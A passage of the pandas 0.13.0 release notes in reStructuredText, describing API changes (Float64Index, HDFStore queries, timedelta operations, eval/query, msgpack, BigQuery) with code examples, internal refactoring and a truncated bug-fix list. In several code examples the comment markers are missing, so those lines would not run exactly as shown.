pd.Panel(np.arange(16).reshape(2, 4, 2),\n      ....:              items=['Item1', 'Item2'],\n      ....:              major_axis=pd.date_range('2001/1/12', periods=4),\n      ....:              minor_axis=['A', 'B'], dtype='float64')\n      ....:\n\n   In [21]: p\n   Out[21]:\n   <class 'pandas.core.panel.Panel'>\n   Dimensions: 2 (items) x 4 (major_axis) x 2 (minor_axis)\n   Items axis: Item1 to Item2\n   Major_axis axis: 2001-01-12 00:00:00 to 2001-01-15 00:00:00\n   Minor_axis axis: A to B\n\n   In [22]: p.loc[:, :, 'C'] = pd.Series([30, 32], index=p.items)\n\n   In [23]: p\n   Out[23]:\n   <class 'pandas.core.panel.Panel'>\n   Dimensions: 2 (items) x 4 (major_axis) x 3 (minor_axis)\n   Items axis: Item1 to Item2\n   Major_axis axis: 2001-01-12 00:00:00 to 2001-01-15 00:00:00\n   Minor_axis axis: A to C\n\n   In [24]: p.loc[:, :, 'C']\n   Out[24]:\n               Item1  Item2\n   2001-01-12   30.0   32.0\n   2001-01-13   30.0   32.0\n   2001-01-14   30.0   32.0\n   2001-01-15   30.0   32.0\n\nFloat64Index API change\n~~~~~~~~~~~~~~~~~~~~~~~\n\n- Added a new index type, ``Float64Index``. This will be automatically created when passing floating values in index creation.\n  This enables a pure label-based slicing paradigm that makes ``[],ix,loc`` for scalar indexing and slicing work exactly the\n  same. (:issue:`263`)\n\n  Construction is by default for floating type values.\n\n  .. ipython:: python\n\n     index = pd.Index([1.5, 2, 3, 4.5, 5])\n     index\n     s = pd.Series(range(5), index=index)\n     s\n\n  Scalar selection for ``[],.ix,.loc`` will always be label based. An integer will match an equal float index (e.g. ``3`` is equivalent to ``3.0``)\n\n  .. ipython:: python\n\n     s[3]\n     s.loc[3]\n\n  The only positional indexing is via ``iloc``\n\n  .. ipython:: python\n\n     s.iloc[3]\n\n  A scalar index that is not found will raise ``KeyError``\n\n  Slicing is ALWAYS on the values of the index, for ``[],ix,loc`` and ALWAYS positional with ``iloc``\n\n  .. ipython:: python\n     :okwarning:\n\n     s[2:4]\n     s.loc[2:4]\n     s.iloc[2:4]\n\n  In float indexes, slicing using floats are allowed\n\n  .. ipython:: python\n\n     s[2.1:4.6]\n     s.loc[2.1:4.6]\n\n- Indexing on other index types are preserved (and positional fallback for ``[],ix``), with the exception, that floating point slicing\n  on indexes on non ``Float64Index`` will now raise a ``TypeError``.\n\n  .. code-block:: ipython\n\n     In [1]: pd.Series(range(5))[3.5]\n     TypeError: the label [3.5] is not a proper indexer for this index type (Int64Index)\n\n     In [1]: pd.Series(range(5))[3.5:4.5]\n     TypeError: the slice start [3.5] is not a proper indexer for this index type (Int64Index)\n\n  Using a scalar float indexer will be deprecated in a future version, but is allowed for now.\n\n  .. code-block:: ipython\n\n     In [3]: pd.Series(range(5))[3.0]\n     Out[3]: 3\n\nHDFStore API changes\n~~~~~~~~~~~~~~~~~~~~\n\n- Query Format Changes. A much more string-like query format is now supported. See :ref:`the docs<io.hdf5-query>`.\n\n  .. ipython:: python\n\n     path = 'test.h5'\n     dfq = pd.DataFrame(np.random.randn(10, 4),\n                        columns=list('ABCD'),\n                        index=pd.date_range('20130101', periods=10))\n     dfq.to_hdf(path, key='dfq', format='table', data_columns=True)\n\n  Use boolean expressions, with in-line function evaluation.\n\n  .. ipython:: python\n\n     pd.read_hdf(path, 'dfq',\n                 where=\"index>Timestamp('20130104') & columns=['A', 'B']\")\n\n  Use an inline column reference\n\n  .. ipython:: python\n\n     pd.read_hdf(path, 'dfq',\n                 where=\"A>0 or C>0\")\n\n  .. ipython:: python\n     :suppress:\n\n     import os\n     os.remove(path)\n\n- the ``format`` keyword now replaces the ``table`` keyword; allowed values are ``fixed(f)`` or ``table(t)``\n  the same defaults as prior < 0.13.0 remain, e.g. ``put`` implies ``fixed`` format and ``append`` implies\n  ``table`` format. This default format can be set as an option by setting ``io.hdf.default_format``.\n\n  .. ipython:: python\n\n     path = 'test.h5'\n     df = pd.DataFrame(np.random.randn(10, 2))\n     df.to_hdf(path, key='df_table', format='table')\n     df.to_hdf(path, key='df_table2', append=True)\n     df.to_hdf(path, key='df_fixed')\n     with pd.HDFStore(path) as store:\n         print(store)\n\n  .. ipython:: python\n     :suppress:\n\n     import os\n     os.remove(path)\n\n- Significant table writing performance improvements\n- handle a passed ``Series`` in table format (:issue:`4330`)\n- can now serialize a ``timedelta64[ns]`` dtype in a table (:issue:`3577`), See :ref:`the docs<io.hdf5-timedelta>`.\n- added an ``is_open`` property to indicate if the underlying file handle is_open;\n  a closed store will now report 'CLOSED' when viewing the store (rather than raising an error)\n  (:issue:`4409`)\n- a close of a ``HDFStore`` now will close that instance of the ``HDFStore``\n  but will only close the actual file if the ref count (by ``PyTables``) w.r.t. all of the open handles\n  are 0. Essentially you have a local instance of ``HDFStore`` referenced by a variable. Once you\n  close it, it will report closed. Other references (to the same file) will continue to operate\n  until they themselves are closed. Performing an action on a closed file will raise\n  ``ClosedFileError``\n\n  .. ipython:: python\n\n     path = 'test.h5'\n     df = pd.DataFrame(np.random.randn(10, 2))\n     store1 = pd.HDFStore(path)\n     store2 = pd.HDFStore(path)\n     store1.append('df', df)\n     store2.append('df2', df)\n\n     store1\n     store2\n     store1.close()\n     store2\n     store2.close()\n     store2\n\n  .. ipython:: python\n     :suppress:\n\n     import os\n     os.remove(path)\n\n- removed the ``_quiet`` attribute, replace by a ``DuplicateWarning`` if retrieving\n  duplicate rows from a table (:issue:`4367`)\n- removed the ``warn`` argument from ``open``. Instead a ``PossibleDataLossError`` exception will\n  be raised if you try to use ``mode='w'`` with an OPEN file handle (:issue:`4367`)\n- allow a passed locations array or mask as a ``where`` condition (:issue:`4467`).\n  See :ref:`the docs<io.hdf5-where_mask>` for an example.\n- add the keyword ``dropna=True`` to ``append`` to change whether ALL nan rows are not written\n  to the store (default is ``True``, ALL nan rows are NOT written), also settable\n  via the option ``io.hdf.dropna_table`` (:issue:`4625`)\n- pass through store creation arguments; can be used to support in-memory stores\n\nDataFrame repr changes\n~~~~~~~~~~~~~~~~~~~~~~\n\nThe HTML and plain text representations of :class:`DataFrame` now show\na truncated view of the table once it exceeds a certain size, rather\nthan switching to the short info view (:issue:`4886`, :issue:`5550`).\nThis makes the representation more consistent as small DataFrames get\nlarger.\n\n.. image:: ../_static/df_repr_truncated.png\n   :alt: Truncated HTML representation of a DataFrame\n\nTo get the info view, call :meth:`DataFrame.info`. If you prefer the\ninfo view as the repr for large DataFrames, you can set this by running\n``set_option('display.large_repr', 'info')``.\n\nEnhancements\n~~~~~~~~~~~~\n\n- ``df.to_clipboard()`` learned a new ``excel`` keyword that let's you\n  paste df data directly into excel (enabled by default). (:issue:`5070`).\n- ``read_html`` now raises a ``URLError`` instead of catching and raising a\n  ``ValueError`` (:issue:`4303`, :issue:`4305`)\n- Added a test for ``read_clipboard()`` and ``to_clipboard()`` (:issue:`4282`)\n- Clipboard functionality now works with PySide (:issue:`4282`)\n- Added a more informative error message when plot arguments contain\n  overlapping color and style arguments (:issue:`4402`)\n- ``to_dict`` now takes ``records`` as a possible out type.  Returns an array\n  of column-keyed dictionaries. (:issue:`4936`)\n\n- ``NaN`` handing in get_dummies (:issue:`4446`) with ``dummy_na``\n\n  .. ipython:: python\n\n      previously, nan was erroneously counted as 2 here\n      now it is not counted at all\n     pd.get_dummies([1, 2, np.nan])\n\n      unless requested\n     pd.get_dummies([1, 2, np.nan], dummy_na=True)\n\n\n- ``timedelta64[ns]`` operations. See :ref:`the docs<timedeltas.timedeltas_convert>`.\n\n  .. warning::\n\n     Most of these operations require ``numpy >= 1.7``\n\n  Using the new top-level ``to_timedelta``, you can convert a scalar or array from the standard\n  timedelta format (produced by ``to_csv``) into a timedelta type (``np.timedelta64`` in ``nanoseconds``).\n\n  .. ipython:: python\n\n     pd.to_timedelta('1 days 06:05:01.00003')\n     pd.to_timedelta('15.5us')\n     pd.to_timedelta(['1 days 06:05:01.00003', '15.5us', 'nan'])\n     pd.to_timedelta(np.arange(5), unit='s')\n     pd.to_timedelta(np.arange(5), unit='d')\n\n  A Series of dtype ``timedelta64[ns]`` can now be divided by another\n  ``timedelta64[ns]`` object, or astyped to yield a ``float64`` dtyped Series. This\n  is frequency conversion. See :ref:`the docs<timedeltas.timedeltas_convert>` for the docs.\n\n  .. ipython:: python\n\n     import datetime\n     td = pd.Series(pd.date_range('20130101', periods=4)) - pd.Series(\n         pd.date_range('20121201', periods=4))\n     td[2] += np.timedelta64(datetime.timedelta(minutes=5, seconds=3))\n     td[3] = np.nan\n     td\n\n  .. code-block:: ipython\n\n      to days\n     In [63]: td / np.timedelta64(1, 'D')\n     Out[63]:\n     0    31.000000\n     1    31.000000\n     2    31.003507\n     3          NaN\n     dtype: float64\n\n     In [64]: td.astype('timedelta64[D]')\n     Out[64]:\n     0    31.0\n     1    31.0\n     2    31.0\n     3     NaN\n     dtype: float64\n\n      to seconds\n     In [65]: td / np.timedelta64(1, 's')\n     Out[65]:\n     0    2678400.0\n     1    2678400.0\n     2    2678703.0\n     3          NaN\n     dtype: float64\n\n     In [66]: td.astype('timedelta64[s]')\n     Out[66]:\n     0    2678400.0\n     1    2678400.0\n     2    2678703.0\n     3          NaN\n     dtype: float64\n\n  Dividing or multiplying a ``timedelta64[ns]`` Series by an integer or integer Series\n\n  .. ipython:: python\n\n     td * -1\n     td * pd.Series([1, 2, 3, 4])\n\n  Absolute ``DateOffset`` objects can act equivalently to ``timedeltas``\n\n  .. ipython:: python\n\n     from pandas import offsets\n     td + offsets.Minute(5) + offsets.Milli(5)\n\n  Fillna is now supported for timedeltas\n\n  .. ipython:: python\n\n     td.fillna(pd.Timedelta(0))\n     td.fillna(datetime.timedelta(days=1, seconds=5))\n\n  You can do numeric reduction operations on timedeltas.\n\n  .. ipython:: python\n\n     td.mean()\n     td.quantile(.1)\n\n- ``plot(kind='kde')`` now accepts the optional parameters ``bw_method`` and\n  ``ind``, passed to scipy.stats.gaussian_kde() (for scipy >= 0.11.0) to set\n  the bandwidth, and to gkde.evaluate() to specify the indices at which it\n  is evaluated, respectively. See scipy docs. (:issue:`4298`)\n\n- DataFrame constructor now accepts a numpy masked record array (:issue:`3478`)\n\n- The new vectorized string method ``extract`` return regular expression\n  matches more conveniently.\n\n  .. ipython:: python\n     :okwarning:\n\n     pd.Series(['a1', 'b2', 'c3']).str.extract('[ab](\\\\d)')\n\n  Elements that do not match return ``NaN``. Extracting a regular expression\n  with more than one group returns a DataFrame with one column per group.\n\n\n  .. ipython:: python\n     :okwarning:\n\n     pd.Series(['a1', 'b2', 'c3']).str.extract('([ab])(\\\\d)')\n\n  Elements that do not match return a row of ``NaN``.\n  Thus, a Series of messy strings can be *converted* into a\n  like-indexed Series or DataFrame of cleaned-up or more useful strings,\n  without necessitating ``get()`` to access tuples or ``re.match`` objects.\n\n  Named groups like\n\n  .. ipython:: python\n     :okwarning:\n\n     pd.Series(['a1', 'b2', 'c3']).str.extract(\n         '(?P<letter>[ab])(?P<digit>\\\\d)')\n\n  and optional groups can also be used.\n\n  .. ipython:: python\n     :okwarning:\n\n      pd.Series(['a1', 'b2', '3']).str.extract(\n          '(?P<letter>[ab])?(?P<digit>\\\\d)')\n\n- ``read_stata`` now accepts Stata 13 format (:issue:`4291`)\n\n- ``read_fwf`` now infers the column specifications from the first 100 rows of\n  the file if the data has correctly separated and properly aligned columns\n  using the delimiter provided to the function (:issue:`4488`).\n\n- support for nanosecond times as an offset\n\n  .. warning::\n\n     These operations require ``numpy >= 1.7``\n\n  Period conversions in the range of seconds and below were reworked and extended\n  up to nanoseconds. Periods in the nanosecond range are now available.\n\n  .. code-block:: python\n\n     In [79]: pd.date_range('2013-01-01', periods=5, freq='5N')\n     Out[79]:\n     DatetimeIndex([          '2013-01-01 00:00:00',\n                    '2013-01-01 00:00:00.000000005',\n                    '2013-01-01 00:00:00.000000010',\n                    '2013-01-01 00:00:00.000000015',\n                    '2013-01-01 00:00:00.000000020'],\n                   dtype='datetime64[ns]', freq='5N')\n\n  or with frequency as offset\n\n  .. ipython:: python\n\n     pd.date_range('2013-01-01', periods=5, freq=pd.offsets.Nano(5))\n\n  Timestamps can be modified in the nanosecond range\n\n  .. ipython:: python\n\n     t = pd.Timestamp('20130101 09:01:02')\n     t + pd.tseries.offsets.Nano(123)\n\n- A new method, ``isin`` for DataFrames, which plays nicely with boolean indexing. The argument to ``isin``, what we're comparing the DataFrame to, can be a DataFrame, Series, dict, or array of values. See :ref:`the docs<indexing.basics.indexing_isin>` for more.\n\n  To get the rows where any of the conditions are met:\n\n  .. ipython:: python\n\n     dfi = pd.DataFrame({'A': [1, 2, 3, 4], 'B': ['a', 'b', 'f', 'n']})\n     dfi\n     other = pd.DataFrame({'A': [1, 3, 3, 7], 'B': ['e', 'f', 'f', 'e']})\n     mask = dfi.isin(other)\n     mask\n     dfi[mask.any(axis=1)]\n\n- ``Series`` now supports a ``to_frame`` method to convert it to a single-column DataFrame (:issue:`5164`)\n\n- All R datasets listed here http://stat.ethz.ch/R-manual/R-devel/library/datasets/html/00Index.html can now be loaded into pandas objects\n\n  .. code-block:: python\n\n      note that pandas.rpy was deprecated in v0.16.0\n     import pandas.rpy.common as com\n     com.load_data('Titanic')\n\n- ``tz_localize`` can infer a fall daylight savings transition based on the structure\n  of the unlocalized data (:issue:`4230`), see :ref:`the docs<timeseries.timezone>`\n\n- ``DatetimeIndex`` is now in the API documentation, see :ref:`the docs<api.datetimeindex>`\n\n- :meth:`~pandas.io.json.json_normalize` is a new method to allow you to create a flat table\n  from semi-structured JSON data. See :ref:`the docs<io.json_normalize>` (:issue:`1067`)\n\n- Added PySide support for the qtpandas DataFrameModel and DataFrameWidget.\n\n- Python csv parser now supports usecols (:issue:`4335`)\n\n- Frequencies gained several new offsets:\n\n  * ``LastWeekOfMonth`` (:issue:`4637`)\n  * ``FY5253``, and ``FY5253Quarter`` (:issue:`4511`)\n\n\n- DataFrame has a new ``interpolate`` method, similar to Series (:issue:`4434`, :issue:`1892`)\n\n  .. ipython:: python\n\n      df = pd.DataFrame({'A': [1, 2.1, np.nan, 4.7, 5.6, 6.8],\n                        'B': [.25, np.nan, np.nan, 4, 12.2, 14.4]})\n      df.interpolate()\n\n  Additionally, the ``method`` argument to ``interpolate`` has been expanded\n  to include ``'nearest', 'zero', 'slinear', 'quadratic', 'cubic',\n  'barycentric', 'krogh', 'piecewise_polynomial', 'pchip', 'polynomial', 'spline'``\n  The new methods require scipy_. Consult the Scipy reference guide_ and documentation_ for more information\n  about when the various methods are appropriate. See :ref:`the docs<missing_data.interpolate>`.\n\n  Interpolate now also accepts a ``limit`` keyword argument.\n  This works similar to ``fillna``'s limit:\n\n  .. ipython:: python\n\n    ser = pd.Series([1, 3, np.nan, np.nan, np.nan, 11])\n    ser.interpolate(limit=2)\n\n- Added ``wide_to_long`` panel data convenience function. See :ref:`the docs<reshaping.melt>`.\n\n  .. ipython:: python\n\n    np.random.seed(123)\n    df = pd.DataFrame({\"A1970\" : {0 : \"a\", 1 : \"b\", 2 : \"c\"},\n                       \"A1980\" : {0 : \"d\", 1 : \"e\", 2 : \"f\"},\n                       \"B1970\" : {0 : 2.5, 1 : 1.2, 2 : .7},\n                       \"B1980\" : {0 : 3.2, 1 : 1.3, 2 : .1},\n                       \"X\"     : dict(zip(range(3), np.random.randn(3)))\n                      })\n    df[\"id\"] = df.index\n    df\n    pd.wide_to_long(df, [\"A\", \"B\"], i=\"id\", j=\"year\")\n\n.. _scipy: http://www.scipy.org\n.. _documentation: http://docs.scipy.org/doc/scipy/reference/interpolate.html#univariate-interpolation\n.. _guide: https://docs.scipy.org/doc/scipy/tutorial/interpolate.html\n\n- ``to_csv`` now takes a ``date_format`` keyword argument that specifies how\n  output datetime objects should be formatted. Datetimes encountered in the\n  index, columns, and values will all have this formatting applied. (:issue:`4313`)\n- ``DataFrame.plot`` will scatter plot x versus y by passing ``kind='scatter'`` (:issue:`2215`)\n- Added support for Google Analytics v3 API segment IDs that also supports v2 IDs. (:issue:`5271`)\n\n.. _whatsnew_0130.experimental:\n\nExperimental\n~~~~~~~~~~~~\n\n- The new :func:`~pandas.eval` function implements expression evaluation using\n  ``numexpr`` behind the scenes. This results in large speedups for\n  complicated expressions involving large DataFrames/Series. For example,\n\n  .. ipython:: python\n\n     nrows, ncols = 20000, 100\n     df1, df2, df3, df4 = [pd.DataFrame(np.random.randn(nrows, ncols))\n                           for _ in range(4)]\n\n  .. ipython:: python\n\n      eval with NumExpr backend\n     %timeit pd.eval('df1 + df2 + df3 + df4')\n\n  .. ipython:: python\n\n      pure Python evaluation\n     %timeit df1 + df2 + df3 + df4\n\n  For more details, see the :ref:`the docs<enhancingperf.eval>`\n\n- Similar to ``pandas.eval``, :class:`~pandas.DataFrame` has a new\n  ``DataFrame.eval`` method that evaluates an expression in the context of\n  the ``DataFrame``. For example,\n\n  .. ipython:: python\n     :suppress:\n\n     try:\n         del a   noqa: F821\n     except NameError:\n         pass\n\n     try:\n         del b   noqa: F821\n     except NameError:\n         pass\n\n  .. ipython:: python\n\n     df = pd.DataFrame(np.random.randn(10, 2), columns=['a', 'b'])\n     df.eval('a + b')\n\n- :meth:`~pandas.DataFrame.query` method has been added that allows\n  you to select elements of a ``DataFrame`` using a natural query syntax\n  nearly identical to Python syntax. For example,\n\n  .. ipython:: python\n     :suppress:\n\n     try:\n         del a   noqa: F821\n     except NameError:\n         pass\n\n     try:\n         del b   noqa: F821\n     except NameError:\n         pass\n\n     try:\n         del c   noqa: F821\n     except NameError:\n         pass\n\n  .. ipython:: python\n\n     n = 20\n     df = pd.DataFrame(np.random.randint(n, size=(n, 3)), columns=['a', 'b', 'c'])\n     df.query('a < b < c')\n\n  selects all the rows of ``df`` where ``a < b < c`` evaluates to ``True``.\n  For more details see the :ref:`the docs<indexing.query>`.\n\n- ``pd.read_msgpack()`` and ``pd.to_msgpack()`` are now a supported method of serialization\n  of arbitrary pandas (and python objects) in a lightweight portable binary format. See :ref:`the docs<io.msgpack>`\n\n  .. warning::\n\n     Since this is an EXPERIMENTAL LIBRARY, the storage format may not be stable until a future release.\n\n  .. code-block:: python\n\n     df = pd.DataFrame(np.random.rand(5, 2), columns=list('AB'))\n     df.to_msgpack('foo.msg')\n     pd.read_msgpack('foo.msg')\n\n     s = pd.Series(np.random.rand(5), index=pd.date_range('20130101', periods=5))\n     pd.to_msgpack('foo.msg', df, s)\n     pd.read_msgpack('foo.msg')\n\n  You can pass ``iterator=True`` to iterator over the unpacked results\n\n  .. code-block:: python\n\n     for o in pd.read_msgpack('foo.msg', iterator=True):\n         print(o)\n\n  .. ipython:: python\n     :suppress:\n     :okexcept:\n\n     os.remove('foo.msg')\n\n- ``pandas.io.gbq`` provides a simple way to extract from, and load data into,\n  Google's BigQuery Data Sets by way of pandas DataFrames. BigQuery is a high\n  performance SQL-like database service, useful for performing ad-hoc queries\n  against extremely large datasets. :ref:`See the docs <io.bigquery>`\n\n  .. code-block:: python\n\n     from pandas.io import gbq\n\n      A query to select the average monthly temperatures in the\n      in the year 2000 across the USA. The dataset,\n      publicata:samples.gsod, is available on all BigQuery accounts,\n      and is based on NOAA gsod data.\n\n     query = \"\"\"SELECT station_number as STATION,\n     month as MONTH, AVG(mean_temp) as MEAN_TEMP\n     FROM publicdata:samples.gsod\n     WHERE YEAR = 2000\n     GROUP BY STATION, MONTH\n     ORDER BY STATION, MONTH ASC\"\"\"\n\n      Fetch the result set for this query\n\n      Your Google BigQuery Project ID\n      To find this, see your dashboard:\n      https://console.developers.google.com/iam-admin/projects?authuser=0\n     projectid = 'xxxxxxxxx'\n     df = gbq.read_gbq(query, project_id=projectid)\n\n      Use pandas to process and reshape the dataset\n\n     df2 = df.pivot(index='STATION', columns='MONTH', values='MEAN_TEMP')\n     df3 = pd.concat([df2.min(), df2.mean(), df2.max()],\n                     axis=1, keys=[\"Min Tem\", \"Mean Temp\", \"Max Temp\"])\n\n  The resulting DataFrame is::\n\n     > df3\n                 Min Tem  Mean Temp    Max Temp\n      MONTH\n      1     -53.336667  39.827892   89.770968\n      2     -49.837500  43.685219   93.437932\n      3     -77.926087  48.708355   96.099998\n      4     -82.892858  55.070087   97.317240\n      5     -92.378261  61.428117  102.042856\n      6     -77.703334  65.858888  102.900000\n      7     -87.821428  68.169663  106.510714\n      8     -89.431999  68.614215  105.500000\n      9     -86.611112  63.436935  107.142856\n      10    -78.209677  56.880838   92.103333\n      11    -50.125000  48.861228   94.996428\n      12    -50.332258  42.286879   94.396774\n\n  .. warning::\n\n     To use this module, you will need a BigQuery account. See\n     <https://cloud.google.com/products/big-query> for details.\n\n     As of 10/10/13, there is a bug in Google's API preventing result sets\n     from being larger than 100,000 rows. A patch is scheduled for the week of\n     10/14/13.\n\n.. _whatsnew_0130.refactoring:\n\nInternal refactoring\n~~~~~~~~~~~~~~~~~~~~\n\nIn 0.13.0 there is a major refactor primarily to subclass ``Series`` from\n``NDFrame``, which is the base class currently for ``DataFrame`` and ``Panel``,\nto unify methods and behaviors. Series formerly subclassed directly from\n``ndarray``. (:issue:`4080`, :issue:`3862`, :issue:`816`)\n\n.. warning::\n\n   There are two potential incompatibilities from < 0.13.0\n\n   - Using certain numpy functions would previously return a ``Series`` if passed a ``Series``\n     as an argument. This seems only to affect ``np.ones_like``, ``np.empty_like``,\n     ``np.diff`` and ``np.where``. These now return ``ndarrays``.\n\n     .. ipython:: python\n\n        s = pd.Series([1, 2, 3, 4])\n\n     Numpy Usage\n\n     .. ipython:: python\n\n        np.ones_like(s)\n        np.diff(s)\n        np.where(s > 1, s, np.nan)\n\n     Pandonic Usage\n\n     .. ipython:: python\n\n        pd.Series(1, index=s.index)\n        s.diff()\n        s.where(s > 1)\n\n   - Passing a ``Series`` directly to a cython function expecting an ``ndarray`` type will no\n     long work directly, you must pass ``Series.values``, See :ref:`Enhancing Performance<enhancingperf.ndarray>`\n\n   - ``Series(0.5)`` would previously return the scalar ``0.5``, instead this will return a 1-element ``Series``\n\n   - This change breaks ``rpy2<=2.3.8``. an Issue has been opened against rpy2 and a workaround\n     is detailed in :issue:`5698`. Thanks JanSchulz.\n\n- Pickle compatibility is preserved for pickles created prior to 0.13. These must be unpickled with ``pd.read_pickle``, see :ref:`Pickling<io.pickle>`.\n\n- Refactor of series.py/frame.py/panel.py to move common code to generic.py\n\n  - added ``_setup_axes`` to created generic NDFrame structures\n  - moved methods\n\n    - ``from_axes,_wrap_array,axes,ix,loc,iloc,shape,empty,swapaxes,transpose,pop``\n    - ``__iter__,keys,__contains__,__len__,__neg__,__invert__``\n    - ``convert_objects,as_blocks,as_matrix,values``\n    - ``__getstate__,__setstate__`` (compat remains in frame/panel)\n    - ``__getattr__,__setattr__``\n    - ``_indexed_same,reindex_like,align,where,mask``\n    - ``fillna,replace`` (``Series`` replace is now consistent with ``DataFrame``)\n    - ``filter`` (also added axis argument to selectively filter on a different axis)\n    - ``reindex,reindex_axis,take``\n    - ``truncate`` (moved to become part of ``NDFrame``)\n\n- These are API changes which make ``Panel`` more consistent with ``DataFrame``\n\n  - ``swapaxes`` on a ``Panel`` with the same axes specified now return a copy\n  - support attribute access for setting\n  - filter supports the same API as the original ``DataFrame`` filter\n\n- Reindex called with no arguments will now return a copy of the input object\n\n- ``TimeSeries`` is now an alias for ``Series``. the property ``is_time_series``\n  can be used to distinguish (if desired)\n\n- Refactor of Sparse objects to use BlockManager\n\n  - Created a new block type in internals, ``SparseBlock``, which can hold multi-dtypes\n    and is non-consolidatable. ``SparseSeries`` and ``SparseDataFrame`` now inherit\n    more methods from there hierarchy (Series/DataFrame), and no longer inherit\n    from ``SparseArray`` (which instead is the object of the ``SparseBlock``)\n  - Sparse suite now supports integration with non-sparse data. Non-float sparse\n    data is supportable (partially implemented)\n  - Operations on sparse structures within DataFrames should preserve sparseness,\n    merging type operations will convert to dense (and back to sparse), so might\n    be somewhat inefficient\n  - enable setitem on ``SparseSeries`` for boolean/integer/slices\n  - ``SparsePanels`` implementation is unchanged (e.g. not using BlockManager, needs work)\n\n- added ``ftypes`` method to Series/DataFrame, similar to ``dtypes``, but indicates\n  if the underlying is sparse/dense (as well as the dtype)\n- All ``NDFrame`` objects can now use ``__finalize__()`` to specify various\n  values to propagate to new objects from an existing one (e.g. ``name`` in ``Series`` will\n  follow more automatically now)\n- Internal type checking is now done via a suite of generated classes, allowing ``isinstance(value, klass)``\n  without having to directly import the klass, courtesy of jtratner\n- Bug in Series update where the parent frame is not updating its cache based on\n  changes (:issue:`4080`) or types (:issue:`3217`), fillna (:issue:`3386`)\n- Indexing with dtype conversions fixed (:issue:`4463`, :issue:`4204`)\n- Refactor ``Series.reindex`` to core/generic.py (:issue:`4604`, :issue:`4618`), allow ``method=`` in reindexing\n  on a Series to work\n- ``Series.copy`` no longer accepts the ``order`` parameter and is now consistent with ``NDFrame`` copy\n- Refactor ``rename`` methods to core/generic.py; fixes ``Series.rename`` for (:issue:`4605`), and adds ``rename``\n  with the same signature for ``Panel``\n- Refactor ``clip`` methods to core/generic.py (:issue:`4798`)\n- Refactor of ``_get_numeric_data/_get_bool_data`` to core/generic.py, allowing Series/Panel functionality\n- ``Series`` (for index) / ``Panel`` (for items) now allow attribute access to its elements  (:issue:`1903`)\n\n  .. ipython:: python\n\n     s = pd.Series([1, 2, 3], index=list('abc'))\n     s.b\n     s.a = 5\n     s\n\n.. _release.bug_fixes-0.13.0:\n\nBug fixes\n~~~~~~~~~\n\n- ``HDFStore``\n\n  - raising an invalid ``TypeError`` rather than ``ValueError`` when\n    appending with a different block ordering (:issue:`4096`)\n  - ``read_hdf`` was not respecting as passed ``mode`` (:issue:`4504`)\n  - appending a 0-len table will work correctly (:issue:`4273`)\n  - ``to_hdf`` was raising when passing both arguments ``append`` and\n    ``table`` (:issue:`4584`)\n  - reading from a store with duplicate columns across dtypes would raise\n    (:issue:`4767`)\n  - Fixed a bug where ``ValueError`` wasn't correctly raised when column\n    names weren't strings (:issue:`4956`)\n  - A zero length series written in Fixed format not deserializing properly.\n    (:issue:`4708`)\n  - Fixed decoding perf issue on pyt3 (:issue:`5441`)\n  - Validate levels in a MultiIndex before storing (:issue:`5527`)\n  - Correctly handle ``data_columns`` with a Panel (:issue:`5717`)\n- Fixed bug in tslib.tz_convert(vals, tz1, tz2): it could raise IndexError\n  exception while trying to access trans[pos + 1] (:issue:`4496`)\n- The ``by`` argument now works correctly with the ``layout`` argument\n  (:issue:`4102`, :issue:`4014`) in ``*.hist`` plotting methods\n- Fixed bug in ``PeriodIndex.map`` where using ``str`` would return the str\n  representation of the index (:issue:`4136`)\n- Fixed test failure ``test_time_series_plot_color_with_empty_kwargs`` when\n  using custom matplotlib default colors (:issue:`4345`)\n- Fix running of stata IO tests. Now uses temporary files to write\n  (:issue:`4353`)\n- Fixed an issue where ``DataFrame.sum`` was slower than ``DataFrame.mean``\n  for integer valued frames (:issue:`4365`)\n- ``read_html`` tests now work with Python 2.6 (:issue:`4351`)\n- Fixed bug where ``network`` testing was throwing ``NameError`` because a\n  local variable was undefined (:issue:`4381`)\n- In ``to_json``, raise if a passed ``orient`` would cause loss of data\n  because of a duplicate index (:issue:`4359`)\n- In ``to_json``, fix date handling so milliseconds are the default timestamp\n  as the docstring says (:issue:`4362`).\n- ``as_index`` is no longer ignored when doing groupby apply (:issue:`4648`,\n  :issue:`3417`)\n- JSON NaT handling fixed, NaTs are now serialized to ``null`` (:issue:`4498`)\n- Fixed JSON handling of escapable characters in JSON object keys\n  (:issue:`4593`)\n- Fixed passing ``keep_default_na=False`` when ``na_values=None``\n  (:issue:`4318`)\n- Fixed bug with ``values`` raising an error on a DataFrame with duplicate\n  columns and mixed dtypes, surfaced in (:issue:`4377`)\n- Fixed bug with duplicate columns and type conversion in ``read_json`` when\n  ``orient='split'`` (:issue:`4377`)\n- Fixed JSON bug where locales with decimal separators other than '.' threw\n  exceptions when encoding / decoding certain values. (:issue:`4918`)\n- Fix ``.iat`` indexing with a ``PeriodIndex`` (:issue:`4390`)\n- Fixed an issue where ``PeriodIndex`` joining with self was returning a new\n  instance rather than the same instance (:issue:`4379`); also adds a test\n  for this for the other index types\n- Fixed a bug with all the dtypes being converted to object when using the\n  CSV cparser with the usecols parameter (:issue:`3192`)\n- Fix an issue in merging blocks where the resulting DataFrame had partially\n  set _ref_locs (:issue:`4403`)\n- Fixed an issue where hist subplots were being overwritten when they were\n  called using the top level matplotlib API (:issue:`4408`)\n- Fixed a bug where calling ``Series.astype(str)`` would truncate the string\n  (:issue:`4405`, :issue:`4437`)\n- Fixed a py3 compat issue where bytes were being repr'd as tuples\n  (:issue:`4455`)\n- Fixed Panel attribute naming conflict if item is named 'a'\n  (:issue:`3440`)\n- Fixed an issue where duplicate indexes were raising when plotting\n  (:issue:`4486`)\n- Fixed an issue where cumsum and cumprod didn't work with bool dtypes\n  (:issue:`4170`, :issue:`4440`)\n- Fixed Panel slicing issued in ``xs`` that was returning an incorrect dimmed\n  object (:issue:`4016`)\n- Fix resampling bug where custom reduce function not used if only one group\n  (:issue:`3849`, :issue:`4494`)\n- Fixed Panel assignment with a transposed frame (:issue:`3830`)\n- Raise on set indexing with a Panel and a Panel as a value which needs\n  alignment (:issue:`3777`)\n- frozenset objects now raise in the ``Series`` constructor (:issue:`4482`,\n  :issue:`4480`)\n- Fixed issue with sorting a duplicate MultiIndex that has multiple dtypes\n  (:issue:`4516`)\n- Fixed bug in ``DataFrame.set_values`` which was causing name attributes to\n  be lost when expanding the index. (:issue:`3742`, :issue:`4039`)\n- Fixed issue where individual ``names``, ``levels`` and ``labels`` could be\n  set on ``MultiIndex`` without validation (:issue:`3714`, :issue:`4039`)\n- Fixed (:issue:`3334`) in pivot_table. Margins did not compute if values is\n  the index.\n- Fix bug in having a rhs of 